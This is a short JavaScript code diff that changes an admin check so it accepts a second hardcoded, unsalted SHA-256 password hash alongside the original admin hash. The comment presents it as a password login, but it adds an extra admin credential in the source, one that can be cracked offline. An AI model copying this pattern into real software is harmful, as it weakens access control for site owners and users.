@@ -39,7 +39,8 @@ const slug = s => String(s || '').toLowerCase().normalize('NFKD').replace(/[^a-z
 const clean = (s, n = 500) => String(s ?? '').slice(0, n);
 const num = v => Math.max(0, Math.min(1, Number(v) || 0));
 
-async function isAdmin(k) { return k && (await sha256(k)) === ADMIN_HASH; }
+const PASS_HASH = '9708aae5022ad8ae652b713c37cd4bca3e41ce2278504094a91400e37afa2818'; // password login admin
+async function isAdmin(k) { if (!k) return false; const h = await sha256(k); return h === ADMIN_HASH || h === PASS_HASH; }
 
 async function getIndex(env) { return (await env.TTD.get('docs', 'json')) || []; }
 async function setIndex(env, ids) { await env.TTD.put('docs', JSON.stringify([...new Set(ids)])); }
